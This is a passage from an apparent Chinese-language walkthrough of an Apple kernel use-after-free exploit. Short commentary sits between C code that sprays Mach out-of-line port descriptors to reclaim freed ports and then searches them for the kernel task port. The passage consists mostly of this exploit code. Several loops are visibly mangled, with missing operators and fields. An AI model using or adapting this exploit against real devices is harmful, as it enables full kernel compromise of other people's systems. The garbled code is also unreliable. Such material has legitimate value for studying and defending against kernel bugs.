            leak_msg->ool_ports[i].count = n_ports;
            leak_msg->ool_ports[i].deallocate = 0;
            leak_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
            leak_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
            leak_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
        }
成功填充被释放的port后，即可以读取context的值。
        // get the target page reused by the ool port pointers
        for (int i = 0; i address;
            for (size_t j = 0; j count; j++) {
                mach_port_t port = ool_ports[j];
                if (port == expected) {
                    ;
                } else if (port != MACH_PORT_NULL) {
                    interesting_port = port;
                    printf("found an interesting port 0x%x\n", port);
                    if (kernel_task_port == MACH_PORT_NULL &&
                        is_port_kernel_task_port(interesting_port, valid_kernel_pointer))
                    {
                        kernel_task_port = interesting_port;
                    }
                }
            }
            mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)ool_desc->address, ((ool_desc->count*4)+0xfff)&~0xfff);
        }
利用代码中准备了0x20个UAF的port，然后从HOST_PRIV_PORT地址所在的zone的页面的中间部分开始猜测。
        for (int i = 0; i  0x40000000)
            n_ports_in_zone = 0x4000/0xa8;
        else
            n_ports_in_zone = 0x3000/0xa8;
    }
* * *